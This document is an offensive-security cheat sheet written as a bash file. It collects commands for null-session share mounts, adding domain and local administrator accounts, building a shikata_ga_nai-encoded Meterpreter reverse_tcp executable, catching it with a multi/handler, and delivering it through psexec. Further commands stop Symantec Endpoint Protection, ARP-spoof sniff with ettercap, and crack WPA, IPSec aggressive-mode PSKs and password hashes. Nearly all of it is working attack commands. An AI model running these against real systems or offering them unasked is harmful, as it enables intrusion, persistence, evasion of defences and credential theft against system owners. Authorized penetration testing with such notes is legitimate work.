#!/bin/bash


##-===============================================-##
##   [+] Mount Windows Share With Null Session:
##-===============================================-##
net use x: \\server\share "" /u:


##-==================================-##
##   [+] Mount NFS Share on Linux:
##-==================================-##
mount -t nfs server:/share /mnt/$Dir


##-======================================-##
##   [+] Mount Windows Share on Linux:
##-======================================-##
mount -t cifs //server/share -o username=$User,password=$Pass /mnt/$Dir



##-#######################################################-##
## ------------------------------------------------------- ##
##          [+] Add Administrative Accounts:
## ------------------------------------------------------- ##
##-#######################################################-##


##-=========================================-##
##   [+] Add Domain User: 
##   [+] Put Them in Domain Admins Group
##-=========================================-##
net user $User $Pass /ADD /DOMAIN
net group "Domain Admins" $User /ADD /DOMAIN

##-=============================================-##
##   [+] Add Local User:
##   [+] Put Them Local Administrators group
##-=============================================-##
net user $User $Pass /ADD
net localgroup Administrators $User /ADD


##-======================================-##
##   [+] Add A New User:
##   [+] Put Them in The Wheel Group:
##-======================================-##
useradd -G wheel $User


##-=====================================-##
##   [+] Set The New Users Password:
##-=====================================-##
passwd $User


##-=========================================-##
##   [+] Set The Password Using Chpasswd
##-=========================================-##
echo "$User:$Pass"|chpasswd


## ------------------------------------------------------------------------------- ##
##   [?] STDAPI_SYS_PROCESS_EXECUTE: OPERATION FAILED: 1314
## ------------------------------------------------------------------------------- ##
##   [?] If you get this error while trying to drop to as shell in Meterpreter, 
##   [?] try the code below. This is a known bug in meterpreter
 ## ------------------------------------------------------------------------------- ##
execute -f cmd.exe -c -i -H


##-#######################################################-##
## ------------------------------------------------------- ##
##   [+] Metasploit: Use Custom Executable With PSExec:
## ------------------------------------------------------- ##
##-#######################################################-##


##-================================-##
##   [+] Generate An Executable :
##-================================-##
msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4445 R | msfencode -t exe -e x86/shikata_ga_nai -c 5 > custom.exe



##-======================================================================-##
##              [+] Setup Meterpreter Multi/Handler:
##-======================================================================-##
## ---------------------------------------------------------------------- ##
    msf > use exploit/multi/handler
    msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
    PAYLOAD => windows/meterpreter/reverse_tcp
    msf exploit(handler) > set LHOST 192.168.0.1
    LHOST => 192.168.0.1
    msf exploit(handler) > set LPORT 4445
    LPORT => 4445
## __________________________________________________
##  [*] Started reverse handler on 192.168.0.1:4445
##  [*] Starting the payload handler...
## ---------------------------------------------------------------------- ##
##-======================================================================-##



##-======================================================================-##
##             [+] Setup PSExec - [?] In Another MSFConsole
##-======================================================================-##
## ---------------------------------------------------------------------- ##
        msf > use exploit/windows/smb/psexec
        msf exploit(psexec) > set RHOST 192.168.0.2
        RHOST => 192.168.0.2
        msf exploit(psexec) > set SMBUser user
        SMBUser => user
        msf exploit(psexec) > set SMBPass pass
        SMBPass => pass
        msf exploit(psexec) > set EXE::Custom /path/to/custom.exe
        EXE::Custom => /path/to/custom.exe
        msf exploit(psexec) > exploit
## ---------------------------------------------------------------------- ##
##   [?] If Everything Works Then You Should See 
##   [?] A Meterpreter Session Open In Multi/handler
## ---------------------------------------------------------------------- ##
##-======================================================================-##




##-#######################################################-##
## ------------------------------------------------------- ##
##                [+] Disable Antivirus:
## ------------------------------------------------------- ##
##-#######################################################-##


##-=============================================-##
##   [+] Disable Symantec Endpoint Protection:
##-=============================================-##
c:\program files\symantec\symantec endpoint protection\smc -stop


##-======================================-##
##   [+] Use Ettercap To Sniff Traffic:
##-======================================-##
ettercap -M arp -T -q -i interface /spoof_ip/ /target_ips/ -w $File.pcap


##-===================================================-##
##   [+] Cracking WPA/WPA2 PSK With John the Ripper
##-===================================================-##
john --incremental:all --stdout | aircrack-ng --bssid 00-00-00-00-00-00 -a 2 -w -  $File.cap


##-============================================-##
##   [+] Cracking WPA/WPA2 PSK With Hashcat:
##-============================================-##
hashcat wordlist -r /$Dir/d3ad0ne.rule --stdout | aircrack-ng --bssid 00-00-00-00-00-00 -a 2 -w -  $File.cap


##-======================================================-##
##   [+] Cracking IPSEC Agressive Mode Pre-Shared Key:
##-======================================================-##
## ------------------------------------------------------ ##
##  [?] If you’ve never done this, read these first.
## ------------------------------------------------------------------------------------------------- ##
##  [?] http://www.nta-monitor.com/wiki/index.php/Ike-scan_User_Guide
##  [?] http://carnal0wnage.attackresearch.com/2011/12/aggressive-mode-vpn-ike-scan-psk-crack.html
## ------------------------------------------------------------------------------------------------- ##


##-======================================-##
##   [+] Finding Aggressive Mode VPNs:
##-======================================-##
ike-scan -A 192.168.1.0/24


## -------------------------------------------------------------------- ##
##   [?] If The Default Transforms Don't Work,
##   [?] Use The generate_transforms.sh Script From The User Guide.
## -------------------------------------------------------------------- ##
generate-transforms.sh | xargs --max-lines=8 ike-scan 10.0.0.0/24


## -------------------------------------------- ##
##   [?] SonicWALL VPNs Require A Group ID
##   [?] The Default Group ID is: GroupVPN
## -------------------------------------------- ##
ike-scan 192.168.1.1 -A -id GroupVPN


## -------------------------------------------------- ##
##   [?] Use -P To Save The Handshake To A File:
##   [?] Which Can Be Used By PSK-Crack
## -------------------------------------------------- ##
ike-scan 192.168.1.1 -A -Ppsk_192.168.1.1.txt


##-=====================================================-##
##   [+] Crack The Pre-Shared Key Using A Dictionary
##-=====================================================-##
psk-crack -d /$Dir/$File psk_192.168.1.1.txt


##-=====================================-##
##   [+] Create An IP List With NMap
##-=====================================-##
nmap -sL -n 192.168.1.1-100,102-254 | grep "report for" | cut -d " " -f 5 > $IPList.txt


##-=======================================================-##
##   [+] Crack Passwords With John And Korelogic Rules:
##-=======================================================-##
for ruleset in `grep KoreLogicRules john.conf | cut -d: -f 2 | cut -d\] -f 1`; do john --rules:${ruleset} -w:$Wordlist $PassFile ; done







